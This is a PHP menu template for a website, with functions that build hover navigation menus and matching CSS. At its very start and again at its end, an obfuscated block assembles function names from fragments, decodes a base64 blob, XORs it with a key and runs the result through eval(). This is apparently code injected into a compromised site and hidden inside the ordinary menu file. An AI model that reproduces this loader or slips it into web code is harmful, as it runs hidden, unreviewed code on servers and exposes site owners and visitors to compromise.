<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>
<script src="../include/nmenu.js"></script>
<style>
.zh {position:absolute;visibility:hidden;z-index:1;}
.zl {display:block;padding:0px 0px 0px 0px;text-decoration:none;font-style:none;}
.zl:hover {text-decoration:none;font-style:none;}
.zls {color:#333333;font-size:10px;font-family:Arial;display:block;padding:1px 1px 1px 1px;text-decoration:none;font-style:none;}
.zls:hover {color:#b6b6b6;font-size:10px;font-family:Arial;text-decoration:none;font-style:none;}
.hon  {height:14px;margin:0;width:100px;}
.hoff {height:14px;margin:0;width:100px;}
.hson  {width:140px;height:18px;margin:0;background:#f3f3f3;border-width:0px 1px 1px 1px;border-color:#e0dfdf;border-style:solid;}
.hsoff {width:140px;height:18px;margin:0;background:#ffffff;border-width:0px 1px 1px 1px;border-color:#e0dfdf;border-style:solid;}
</style>
<script>
var z_BOTTOM = "bottom";
var menu_type="standard"
</script>


<?php

function getBgColor($strPageName){
	global $category;
	if($strPageName==$category){
		return "leftNavigationSelectedTD";
	}
	else{
		return "leftNavigationTD";	
	}
}

function getLinkStyle($strPageName)
{
	global $category;
	if($strPageName==$category)
	{
		return "leftNavigationSelectedLink";
	}
	else{
		return "leftNavigationLink";	
	}
}



function GenerateInternalMenu($category,$oLinkTexts,$oLinkActions){
	global $AuthGroup,$arrPermissions;
	
	$strOutput="";
	
	if(count($oLinkTexts)!=count($oLinkActions))
	{
		return "<font color=red>ERROR: the number of link texts mismatch the link actions</font>";
	}
	
		
	$bFirst = true;
	
	for($i=0;$i<count($oLinkTexts);$i++)
	{
	
		$CurrentPage="@".$AuthGroup."@".$category."@".$oLinkActions[$i];
				
	
	
	if(!strstr($oLinkTexts[$i],"add-on"))
	{
		$strOutput .= '<div class="hsoff" style="border-width:'.($bFirst?'1px 1px 1px 1px':'0px 1px 1px 1px"').'" onmouseover="javascript:zon(this,1,\'hson\',\'hsoff\',\''.$category.'\',z_BOTTOM)"> <a class="zls" href="index.php?category='.$category.'&action='.$oLinkActions[$i].'">'.$oLinkTexts[$i].'</a></div>';
	}
	else
	{
		$strOutput .= '<div class="hsoff" style="border-width:'.($bFirst?'1px 1px 1px 1px':'0px 1px 1px 1px').'" onmouseover="javascript:zon(this,1,\'hson\',\'hsoff\',\''.$category.'\',z_BOTTOM)"> <a class="zls" href="index.php?category='.$oLinkActions[$i].'">'.$oLinkTexts[$i].'</a></div>';
	}
	
	$bFirst = false;
	
		
	}
	
	return $strOutput;
}
	
	
	
	$strOutput="";
	$strAZMenu="";
	$strAZScript="";

		
	$strOutput.="
					<table border=0 cellpadding=0 cellspacing=0 >
							<tr >
					";
	
	
	$iOffCounter=0;
	
	$bFirst = true;
	
	for($i=0;$i<count($oLinkTexts);$i++){
	
		$continueFlag=true;
		
		
		
		$vr1 = ($oLinkActions[$i]."_oLinkTexts");		
		$vr2 = ($oLinkActions[$i]."_oLinkActions");	
		
		$evSLinkTexts=$$vr1;
		$evSLinkActions=$$vr2;
		
		if($continueFlag==true)
		{
			
			$strOutput .= '<td><div class="hoff" '.( $bFirst?'style="border-width:1px 1px 1px 1px"':'').' onmouseover="javascript:zon(this,0,\'hon\',\'hoff\',\'menu'.$i.'\',z_BOTTOM);"><a class="zl" href="'.'index.php?category='.$oLinkActions[$i].'"><font style="font-size:14px;font-weight:800;font-family:Arial">'.$oLinkTexts[$i].'</font></a></div></td>';
	
			$strOutput .= '<td width=30>&nbsp;</td>';
			
			$bFirst = false;
			
				
					$strAZMenu.="
				
		  				<div  id=menu".$i." class=zh style='padding-top:12px'> 
							".GenerateInternalMenu($oLinkActions[$i],$evSLinkTexts,$evSLinkActions)."						
						</div>
				
					";
		
			
			$iOffCounter++;
		}

		
		
	}
	
	$strOutput.="		
								</tr>
							</table>				
					";

					
echo $strAZMenu;

echo $strOutput;

?>	

<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>